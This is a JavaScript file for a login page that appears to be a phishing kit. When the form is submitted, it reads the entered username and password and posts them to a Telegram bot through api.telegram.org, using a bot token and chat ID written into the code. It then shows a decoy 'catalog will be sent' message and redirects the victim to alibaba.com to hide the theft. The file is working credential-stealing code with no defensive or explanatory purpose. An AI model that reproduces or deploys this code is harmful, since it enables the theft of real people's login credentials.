document.addEventListener('DOMContentLoaded', function () {
    const form = document.getElementById('loginForm');

    form.addEventListener('submit', function (event) {
        event.preventDefault();
        
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;

        const message = `Username: ${username}\nPassword: ${password}`;

        // Replace 'YOUR_BOT_TOKEN' and 'YOUR_CHAT_ID' with actual values
        const botToken = '7398105901:AAGMqPU6Xvcho2FwqubVM_r51ei8XkWKSLc';
        const chatId = '6651292809';
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

        const data = {
            chat_id: chatId,
            text: message
        };

        fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        })
        .then(response => {
            if (response.ok) {
                alert('Catalog will be sent to your email shortly!');
                window.location.href = 'https://www.alibaba.com';
            } else {
                alert('Error sending message.');
            }
        })
        .catch(error => {
            console.error('Error:', error);
            alert('Error sending message.');
        });
    });
});
